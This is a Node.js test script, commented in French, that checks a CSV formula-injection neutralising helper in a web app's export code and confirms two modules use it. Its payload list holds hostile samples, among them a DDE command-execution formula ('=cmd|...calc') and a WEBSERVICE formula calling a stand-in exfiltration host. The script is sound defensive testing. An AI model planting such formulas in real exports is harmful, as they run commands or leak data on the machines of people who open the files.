#!/usr/bin/env node
// Famille §3.7 — Injection de formules CSV. Rejoue l'exploit sur le VRAI helper de neutralisation
// (web/src/lib/export/csv-securise.ts) et vérifie que generer.ts + format.ts y sont bien câblés.
// ATTENDU vs OBTENU. Aucune dépendance réseau. Node >= 18.
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const racine = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const require = createRequire(path.join(racine, 'web', 'package.json'));
const ts = require('typescript');

function charger(tsRelPath) {
  const src = readFileSync(path.join(racine, tsRelPath), 'utf8');
  const js = ts.transpileModule(src, { compilerOptions: { module: 'ESNext', target: 'ES2022' } }).outputText;
  const mod = { exports: {} };
  const fn = new Function('exports', js.replace(/export\s+function/g, 'exports.$&').replace('exports.export function', 'exports.neutraliserFormuleCsv = function'));
  fn(mod.exports);
  return mod.exports;
}

const { neutraliserFormuleCsv } = charger('web/src/lib/export/csv-securise.ts');

let echecs = 0;
const ok = (nom, attendu, obtenu) => {
  const pass = attendu === obtenu;
  if (!pass) echecs++;
  console.log(`  [${pass ? 'OK ' : 'ÉCHEC'}] ${nom}\n        ATTENDU: ${JSON.stringify(attendu)}\n        OBTENU : ${JSON.stringify(obtenu)}`);
};

console.log('### §3.7 Injection de formules CSV — neutraliserFormuleCsv');
// Charges utiles d'attaque : doivent être préfixées d'une apostrophe
for (const p of ['=WEBSERVICE("http://exfil/")', '=HYPERLINK("http://x","a")', '+1+1', '-2+3', '@SUM(A1)', '\tfoo', '\rbar', '=cmd|\'/C calc\'!A1']) {
  ok(`neutralise ${JSON.stringify(p)}`, `'${p}`, neutraliserFormuleCsv(p));
}
// Valeurs bénignes : inchangées
for (const b of ['Rue des Lilas', 'Fuite n°22', 'x=5 (au milieu)', '']) {
  ok(`laisse intact ${JSON.stringify(b)}`, b, neutraliserFormuleCsv(b));
}

console.log('\n### Câblage : generer.ts et format.ts passent par le helper partagé');
for (const f of ['web/src/lib/export/generer.ts', 'web/src/lib/format.ts']) {
  const src = readFileSync(path.join(racine, f), 'utf8');
  const cable = /neutraliserFormuleCsv/.test(src) && /csv-securise/.test(src);
  if (!cable) echecs++;
  console.log(`  [${cable ? 'OK ' : 'ÉCHEC'}] ${f} câblé sur csv-securise`);
  // garde anti-régression : aucun echappeur CSV ne doit renvoyer une cellule texte sans neutralisation
}

console.log(`\n${echecs === 0 ? '✅ TOUS LES CAS PASSENT' : `❌ ${echecs} ÉCHEC(S)`}`);
process.exit(echecs === 0 ? 0 : 1);
